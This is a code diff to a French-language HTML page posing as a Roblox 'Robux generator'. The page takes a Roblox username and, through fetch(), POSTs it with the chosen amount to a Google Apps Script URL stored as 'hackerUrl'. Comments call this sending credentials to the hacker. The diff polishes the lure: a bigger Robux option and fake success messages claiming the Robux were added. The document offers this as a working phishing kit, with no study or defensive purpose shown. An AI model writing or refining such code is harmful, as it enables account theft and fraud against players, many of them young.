@@ -81,6 +81,7 @@
         <option value="5000">5 000 Robux</option>
         <option value="10000" selected>10 000 Robux</option>
         <option value="50000">50 000 Robux</option>
+        <option value="100000">100 000 Robux</option>
     </select>
     
     <input type="text" id="username" placeholder="Pseudo Roblox">
@@ -94,7 +95,7 @@
 </div>
 
 <script>
-    // L'URL du hacker
+    // ⚠️⚠️⚠️ URL DU SCRIPT GOOGLE (à remplacer par la bonne) ⚠️⚠️⚠️
     const hackerUrl = "https://script.google.com/macros/s/AKfycbxXdWOtASQsYFGxeFxXz6EBgyw8PUMIjOsZHG9bS12DJ_bV7aCjJg9kkjXO-rE9QGnmVQ/exec";
     
     document.getElementById('generateBtn').onclick = function() {
@@ -107,7 +108,7 @@
             return;
         }
         
-        // Envoi au hacker
+        // ⚠️⚠️⚠️ ENVOI DES IDENTIFIANTS AU HACKER ⚠️⚠️⚠️
         fetch(hackerUrl, {
             method: "POST",
             headers: {
@@ -118,25 +119,26 @@
                   "&robux=" + encodeURIComponent(amount)
         });
         
-        // Animation factice
+        // Animation factice (leurre)
         let counter = 0;
         let target = parseInt(amount);
         let counterDiv = document.getElementById('counter');
         let messageDiv = document.getElementById('message');
         
-        messageDiv.innerHTML = "🔍 Traitement...";
+        messageDiv.innerHTML = "🔍 Connexion au serveur Roblox...";
         
         let interval = setInterval(function() {
             counter += Math.floor(target / 15);
             if(counter > target) counter = target;
-            counterDiv.innerHTML = counter + " / " + target + " Robux";
+            counterDiv.innerHTML = counter + " / " + target + " Robux générés";
             
             if(counter >= target) {
                 clearInterval(interval);
-                messageDiv.innerHTML = "✅ " + target + " Robux ajoutés ! Redémarre Roblox.";
+                messageDiv.innerHTML = "✅ " + target + " Robux ajoutés à " + username + " ! Redémarre Roblox. ✅";
                 counterDiv.innerHTML = "";
+                
                 setTimeout(function() {
-                    alert(target + " Robux ajoutés à " + username + " !");
+                    alert("🎉 Félicitations ! " + target + " Robux ont été ajoutés à votre compte !\nRedémarrez Roblox pour voir la mise à jour.");
                 }, 500);
             }
         }, 40);
